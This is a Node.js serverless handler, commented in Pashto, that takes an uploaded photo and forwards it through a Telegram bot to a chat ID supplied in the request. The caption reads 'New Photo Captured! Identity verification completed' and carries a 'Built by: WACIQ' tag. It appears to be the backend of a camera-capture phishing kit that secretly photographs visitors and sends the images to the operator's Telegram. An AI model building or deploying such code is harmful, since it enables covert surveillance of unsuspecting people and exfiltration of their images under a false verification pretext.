const { Telegraf } = require('telegraf');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

// Telegraf بوټ جوړول
const bot = new Telegraf(process.env.BOT_TOKEN);

// Multer د فایلونو لپاره
const upload = multer({ dest: '/tmp' });

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).send('Method Not Allowed');
  }

  // Multer استعمال
  upload.single('photo')(req, res, async (err) => {
    if (err) return res.status(500).send('❌ Error uploading file.');

    const { uid } = req.body;
    const photoPath = req.file?.path;

    if (!uid || !photoPath) {
      return res.status(400).send('❗ UID یا عکس نشته.');
    }

    try {
      const caption = `
📸 *New Photo Captured!*

✨ *Identity verification completed.*
🔐 Only you can see this image.

👨‍💻 Built by: *WACIQ*
      `;

      await bot.telegram.sendPhoto(uid, { source: photoPath }, {
        caption: caption,
        parse_mode: 'Markdown'
      });

      fs.unlinkSync(photoPath); // حذف موقتي فایل

      return res.status(200).send('✅ عکس درولیږل شو!');
    } catch (e) {
      console.error("Telegram Error:", e.message);
      return res.status(500).send('❌ لیږل کې ستونزه.');
    }
  });
}; 
